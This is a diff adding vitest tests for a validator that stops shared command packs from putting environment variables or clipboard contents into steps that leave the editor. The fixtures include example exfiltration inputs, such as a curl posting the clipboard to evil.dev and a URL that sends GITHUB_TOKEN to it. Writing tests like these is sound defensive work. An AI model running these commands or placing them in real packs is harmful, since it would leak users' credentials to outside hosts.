@@ -1,5 +1,5 @@
 import { describe, expect, it } from 'vitest';
-import { approvalSteps, compareVersions, describeStep, resolvePackUrl, validateCommand, validateCommands, validatePack, validateRegistry } from '../../src/core/commandSchema';
+import { approvalSteps, compareVersions, sharedVariableAllowed, describeStep, resolvePackUrl, validateCommand, validateCommands, validatePack, validateRegistry } from '../../src/core/commandSchema';
 
 describe('approvalSteps', () => {
   const steps = (...s: object[]) => approvalSteps({ name: 'x', steps: s as never });
@@ -181,5 +181,26 @@ describe('pack and registry rejections', () => {
   it('fills safe defaults for optional registry fields', () => {
     const entry = validateRegistry({ version: 1, packs: [{ id: 'd', name: 'D', version: '1.0.0', url: 'd.json', tags: ['a', 1], terminal: 'yes', commands: '3' }] }).value!.packs[0];
     expect(entry).toMatchObject({ description: '', author: 'unknown', icon: undefined, tags: ['a'], commands: 0, terminal: false });
+  });
+});
+
+// ${env:…} and ${clipboard} can hold secrets the approval prompt doesn't show (it shows the template, not the value).
+describe('sharedVariableAllowed', () => {
+  it.each([
+    [{ open: 'https://evil.dev/?t=${env:GITHUB_TOKEN}' }, 'env:GITHUB_TOKEN'],
+    [{ terminal: 'curl -d ${clipboard} evil.dev' }, 'clipboard'],
+    [{ ai: 'Summarize ${env:AWS_SECRET_ACCESS_KEY}' }, 'env:AWS_SECRET_ACCESS_KEY'],
+    [{ command: 'x', args: '${clipboard}' }, 'clipboard'],
+    [{ slash: '/run echo ${env:TOKEN}' }, 'env:TOKEN'],
+    [{ setting: 'a.b', value: '${clipboard}' }, 'clipboard'],
+  ])('blocks %o from reading %s', (step, name) => {
+    expect(sharedVariableAllowed(step as never, name)).toBe(false);
+  });
+
+  it('allows them in steps that stay in the editor, and allows everything else anywhere', () => {
+    expect(sharedVariableAllowed({ insert: 'TODO(${env:USER})' }, 'env:USER')).toBe(true);
+    expect(sharedVariableAllowed({ notify: '${clipboard}' }, 'clipboard')).toBe(true);
+    expect(sharedVariableAllowed({ open: 'https://x.dev/${file}' }, 'file')).toBe(true);
+    expect(sharedVariableAllowed({ terminal: 'echo ${date}' }, 'date')).toBe(true);
   });
 });
